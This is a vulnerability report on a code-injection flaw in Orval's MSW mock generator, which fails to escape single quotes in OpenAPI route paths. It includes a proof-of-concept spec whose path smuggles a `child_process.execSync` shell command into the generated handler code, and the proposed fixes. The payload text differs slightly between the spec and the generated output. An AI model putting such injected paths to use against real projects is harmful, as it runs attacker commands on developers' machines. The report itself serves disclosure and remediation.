# Orval MSW Route Path Injection Vulnerability Report

## Vulnerability Description

| Field | Value |
|-------|-------|
| Affected Software | @orval/mock |
| Affected Versions | <= 7.17.2 |
| Vulnerability Type | Code Injection |
| Severity | Medium |
| Discovery Date | 2026-01-14 |

### Summary

The MSW (Mock Service Worker) generator in Orval does not escape single quotes when processing OpenAPI route paths. An attacker can inject malicious JavaScript code through crafted route paths in the OpenAPI specification.

## Proof of Concept

### Malicious OpenAPI Spec

```yaml
openapi: 3.0.4
info:
  title: Route Injection Test
  version: 1.0.0
paths:
  "/api/test' + require('child_process').execSync('echo POC > /tmp/poc.txt').toString() + '":
    get:
      summary: Test endpoint
      operationId: testEndpoint
      responses:
        '200':
          description: OK
```

### Generated Code (vulnerable)

**File**: `route-generated/api.ts`

```typescript
export const getTestEndpointMockHandler = (...) => {
  return http.get('*/api/test' + require('child_process').execSync('echo ROUTE_INJECTION > /tmp/route-poc.txt').toString() + '', async (info) => {
    // ...
  })
}
```

**Line 106**: Single quotes are not escaped, allowing code injection.

### Execution Flow

```
[1] Module import → Function defined (no execution)
[2] Developer calls getTestEndpointMockHandler()
[3] http.get() arguments are evaluated
[4] Expression '/api/test' + require(...).toString() + '' is computed
[5] require('child_process').execSync(...) executes!
```

---

## Vulnerability Analysis

### Data Flow

```
Attacker Input (OpenAPI path)
    ↓
" /api/test' + evil() + '"
    ↓
Orval generates code with unescaped route
    ↓
http.get('${route}', ...)  ← No escaping
    ↓
Generated: http.get('*/api/test' + evil() + '', ...)
    ↓
Triggered when handler function is called
    ↓
Code Execution
```

### Vulnerable Code

**File**: `orval-7.17.2/packages/mock/src/faker/getters/route.ts:21-35`

```typescript
export const getRouteMSW = (route: string, baseUrl = '*') => {
  route = route.replaceAll(':', '\\\:');  // Only escapes colons, not single quotes
  const splittedRoute = route.split('/');

  return splittedRoute.reduce((acc, path, i) => {
    if (!path && !i) {
      return acc;
    }

    // Direct concatenation without escaping
    if (!path.includes('{')) {
      return `${acc}/${path}`;  // VULNERABLE
    }

    return `${acc}/${getRoutePath(path)}`;
  }, baseUrl);
};
```

**File**: `orval-7.17.2/packages/mock/src/msw/index.ts:136`

```typescript
return http.${verb}('${route}', async (${infoParam}) => {
//                      ^^^^^^ Unescaped user input
```

### Injection Principle

| Input | Generated Code |
|-------|----------------|
| `/api/users` | `http.get('/api/users', ...)` |
| `/api/test' + evil() + '` | `http.get('*/api/test' + evil() + '', ...)` |

The single quote closes the string literal, allowing arbitrary JavaScript injection.

---

## Fix

### Solution 1: Escape in getRouteMSW

```typescript
export const getRouteMSW = (route: string, baseUrl = '*') => {
  route = route.replaceAll('\\', '\\\\').replaceAll("'", "\\'");
  route = route.replaceAll(':', '\\\\\:');
  // ...
};
```

### Solution 2: Use jsStringEscape (Recommended)

```typescript
import { jsStringEscape } from '@orval/core';

return http.${verb}('${jsStringEscape(route)}', async (${infoParam}) => {
```

---

## Comparison with MCP Vulnerability

| Feature | MCP Summary | MSW Route |
|---------|-------------|-----------|
| Code Location | Module top-level | Inside function |
| Trigger | `import` statement | Function call |
| Auto-Execute | Yes | No |
| Impact | Production | Dev/Test |
| Severity | High | Medium |

---

## PoC Files

| File | Path |
|------|------|
| Malicious OpenAPI | `poc_enum_injection/route-malicious.yaml` |
| Orval Config | `poc_enum_injection/route-poc.config.mjs` |
| Generated Code | `poc_enum_injection/route-generated/api.ts` |

---

## Disclaimer

This vulnerability report is for security research and educational purposes only. All tests were conducted in authorized environments.

---

*Report Date: 2026-01-14*
*Analyzed Version: Orval 7.17.2*
